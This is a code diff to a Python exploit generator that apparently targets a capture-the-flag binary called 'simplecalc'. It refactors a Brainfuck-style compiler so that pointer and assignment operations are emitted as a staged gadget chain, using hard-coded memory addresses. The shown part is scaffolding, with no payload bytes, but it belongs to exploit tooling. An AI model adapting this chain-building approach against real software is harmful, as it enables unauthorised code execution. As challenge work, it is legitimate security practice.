@@ -3,8 +3,11 @@
 from exploiterRaw import exploiterRaw
 from metaGadget import *
 import argparse
-import brainfuck
 import os.path
+from preprocessor import preprocessor
+from preprocessorInitiator import preprocessorInitiator
+
+from sentenceGenerator import sentenceGenerator
 
 EXEC_PATH = './simplecalc'
 
@@ -33,10 +36,11 @@ if args_dict['output']:
 class compiler:
     DATA_SIZE = 3
 
-    def __init__(self, preprocessor : brainfuck.preprocessor, ea_data) -> None:
+    def __init__(self, preprocessor : preprocessor, ea_data, upper : sentenceGenerator = None) -> None:
         self.preprocessor = preprocessor
         self.ea_data = ea_data
         self.tokens = '<>+-.,[]'
+        self.upper = upper
 
 
     def get_data_addr(self, index):
@@ -44,11 +48,11 @@ class compiler:
 
 
     def do_ptr_move(self, direction):
-        MOVE_PTR(self.preprocessor, direction)
+        self.upper.MOVE_PTR(self.preprocessor, direction)
 
 
     def do_ptr_value(self, positive):
-        ADD_PTR(self.preprocessor, positive)
+        self.upper.ADD_PTR(self.preprocessor, positive)
 
 
     def do_output(self):
@@ -94,7 +98,7 @@ class compiler:
 
     def init(self):
         for x in range(self.DATA_SIZE):
-            PRE_ASSIGNMENT(self.get_data_addr(x), 0)
+            self.upper.PRE_ASSIGNMENT(self.get_data_addr(x), 0)
 
 
 def initialize_output_file(output_path):
@@ -108,10 +112,12 @@ def initialize_output_file(output_path):
 if output_path != '':
     initialize_output_file(output_path)
 
-repository_start= 0x00000000006C1060
+repository_start = 0x00000000006C1060
 repository_end = 0x00000000006C5190
 
 repository_size = repository_end - repository_start
+
+# Stage 1
 
 stage1Exploiter = exploiter()
 stage1Exploiter.set_output_file(output_path)
@@ -127,6 +133,17 @@ stage2Exploiter = exploiterRaw()
 stage2Exploiter.set_output_file(output_path)
 gen2 = metaGadetGenerator(stage2Exploiter)
 
-gen2.marker()
-gen2.marker()
+
+
+pre = preprocessor(0x00000000006C1060)
+bf = compiler(pre, 0x00000000006C1060)
+
+upperTranslator = sentenceGenerator(gen2, pre)
+bf.upper = upperTranslator
+
+preprocessorInitiator(pre).initialize(upperTranslator)
+bf.init()
+
+bf.upper.MOVE_PTR(True)
+
 gen2.finalize()
